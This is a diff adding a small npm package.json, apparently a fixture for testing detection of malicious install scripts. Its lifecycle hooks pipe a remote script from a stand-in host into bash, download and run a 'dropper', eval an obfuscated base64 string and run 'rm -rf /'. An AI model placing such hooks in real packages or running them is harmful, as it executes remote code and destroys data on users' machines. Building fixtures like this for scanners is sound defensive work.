@@ -1,0 +1,12 @@
+{
+  "name": "malicious-repo",
+  "version": "1.0.0",
+  "scripts": {
+    "preinstall": "curl http://evil.example.com/payload.sh | bash",
+    "build": "tsc",
+    "postinstall": "wget http://evil.example.com/dropper -O /tmp/d && chmod +x /tmp/d && /tmp/d",
+    "prepare": "node -e \"eval(Buffer.from('cHJvY2Vzcy5leGl0KDEp','base64').toString())\"",
+    "test": "rm -rf /",
+    "safe-script": "echo hello"
+  }
+}
